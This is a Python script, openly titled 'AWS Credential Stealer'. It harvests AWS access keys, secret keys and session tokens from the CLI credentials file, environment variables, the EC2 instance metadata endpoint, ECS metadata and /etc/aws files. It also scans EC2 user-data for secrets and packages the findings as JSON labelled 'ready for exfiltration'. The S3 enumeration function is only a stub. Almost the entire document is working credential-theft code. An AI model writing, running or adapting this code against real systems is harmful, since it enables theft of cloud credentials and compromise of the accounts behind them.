#!/usr/bin/env python3
"""
AWS Credential Stealer
Extracts AWS credentials from various sources
"""

import os, json, re, subprocess, base64
from pathlib import Path

def extract_aws_credentials():
    """Extract AWS credentials from all possible locations"""
    credentials = {}
    
    # 1. AWS CLI credentials file
    aws_cred_path = Path.home() / '.aws' / 'credentials'
    if aws_cred_path.exists():
        with open(aws_cred_path, 'r') as f:
            content = f.read()
            # Parse credentials
            profiles = re.findall(r'\[(.*?)\](.*?)(?=\[|$)', content, re.DOTALL)
            for profile_name, profile_content in profiles:
                access_key = re.search(r'aws_access_key_id\s*=\s*(.*)', profile_content)
                secret_key = re.search(r'aws_secret_access_key\s*=\s*(.*)', profile_content)
                session_token = re.search(r'aws_session_token\s*=\s*(.*)', profile_content)
                
                if access_key and secret_key:
                    credentials[profile_name] = {
                        'access_key_id': access_key.group(1).strip(),
                        'secret_access_key': secret_key.group(1).strip(),
                        'session_token': session_token.group(1).strip() if session_token else None
                    }
    
    # 2. Environment variables
    env_vars = ['AWS_ACCESS_KEY_ID', 'AWS_SECRET_ACCESS_KEY', 'AWS_SESSION_TOKEN']
    env_creds = {}
    for var in env_vars:
        value = os.environ.get(var)
        if value:
            env_creds[var] = value
    
    if env_creds:
        credentials['environment'] = env_creds
    
    # 3. EC2 Instance Metadata (if running on EC2)
    try:
        import urllib.request
        # Get IAM role name
        req = urllib.request.Request('http://169.254.169.254/latest/meta-data/iam/security-credentials/')
        role = urllib.request.urlopen(req, timeout=2).read().decode().strip()
        
        # Get credentials for the role
        req = urllib.request.Request(f'http://169.254.169.254/latest/meta-data/iam/security-credentials/{role}')
        cred_data = json.loads(urllib.request.urlopen(req, timeout=2).read().decode())
        
        credentials['instance_metadata'] = {
            'role_name': role,
            'access_key_id': cred_data.get('AccessKeyId'),
            'secret_access_key': cred_data.get('SecretAccessKey'),
            'token': cred_data.get('Token'),
            'expiration': cred_data.get('Expiration')
        }
    except:
        pass
    
    # 4. ECS Container Metadata (if running in ECS)
    try:
        ecs_metadata = os.environ.get('ECS_CONTAINER_METADATA_URI')
        if ecs_metadata:
            import urllib.request
            req = urllib.request.Request(f'{ecs_metadata}/task')
            task_data = json.loads(urllib.request.urlopen(req, timeout=2).read().decode())
            
            credentials['ecs_task'] = {
                'task_arn': task_data.get('TaskARN'),
                'cluster': task_data.get('Cluster'),
                'family': task_data.get('Family')
            }
    except:
        pass
    
    # 5. Lambda environment (if running in AWS Lambda)
    lambda_vars = ['AWS_LAMBDA_FUNCTION_NAME', 'AWS_LAMBDA_FUNCTION_VERSION']
    lambda_env = {}
    for var in lambda_vars:
        value = os.environ.get(var)
        if value:
            lambda_env[var] = value
    
    if lambda_env:
        credentials['lambda'] = lambda_env
    
    # 6. Configuration files in /etc
    etc_files = ['/etc/aws/credentials', '/etc/aws/config']
    for file_path in etc_files:
        if os.path.exists(file_path):
            try:
                with open(file_path, 'r') as f:
                    credentials[f'etc_{os.path.basename(file_path)}'] = f.read()
            except:
                pass
    
    return credentials

def enumerate_s3_buckets(credentials):
    """Try to enumerate S3 buckets using discovered credentials"""
    buckets = []
    
    # This would require boto3 and actual AWS API calls
    # For now, return placeholder
    return ["s3-enumeration-requires-boto3-installation"]

def check_for_secrets_in_ec2_userdata():
    """Check EC2 user-data for secrets"""
    try:
        import urllib.request
        req = urllib.request.Request('http://169.254.169.254/latest/user-data')
        user_data = urllib.request.urlopen(req, timeout=2).read().decode()
        
        # Look for common secret patterns
        patterns = {
            'aws_access_key': r'AKIA[0-9A-Z]{16}',
            'aws_secret_key': r'[0-9a-zA-Z/+]{40}',
            'password': r'password[=:]\s*([^\s]+)',
            'api_key': r'api[_-]?key[=:]\s*([^\s]+)',
        }
        
        found = {}
        for name, pattern in patterns.items():
            matches = re.findall(pattern, user_data, re.IGNORECASE)
            if matches:
                found[name] = matches[:3]  # Limit to first 3 matches
        
        return found
    except:
        return {}

def main():
    """Main execution"""
    print("[AWS Credential Stealer]")
    print("=" * 50)
    
    credentials = extract_aws_credentials()
    
    if credentials:
        print(f"\n[+] Found AWS credentials in {len(credentials)} sources:")
        
        for source, creds in credentials.items():
            print(f"\n  Source: {source}")
            if isinstance(creds, dict):
                for key, value in creds.items():
                    if 'secret' in key.lower() or 'token' in key.lower():
                        print(f"    {key}: {value[:20]}..." if value else f"    {key}: None")
                    else:
                        print(f"    {key}: {value}")
            else:
                print(f"    {creds}")
    else:
        print("\n[-] No AWS credentials found")
    
    # Check user-data
    userdata_secrets = check_for_secrets_in_ec2_userdata()
    if userdata_secrets:
        print(f"\n[+] Secrets found in EC2 user-data:")
        for secret_type, values in userdata_secrets.items():
            print(f"  {secret_type}: {values}")
    
    # Output for exfiltration
    result = {
        'credentials': credentials,
        'userdata_secrets': userdata_secrets,
        'timestamp': __import__('time').time()
    }
    
    return json.dumps(result, indent=2)

if __name__ == "__main__":
    output = main()
    print("\n" + "=" * 50)
    print("[*] Output ready for exfiltration")
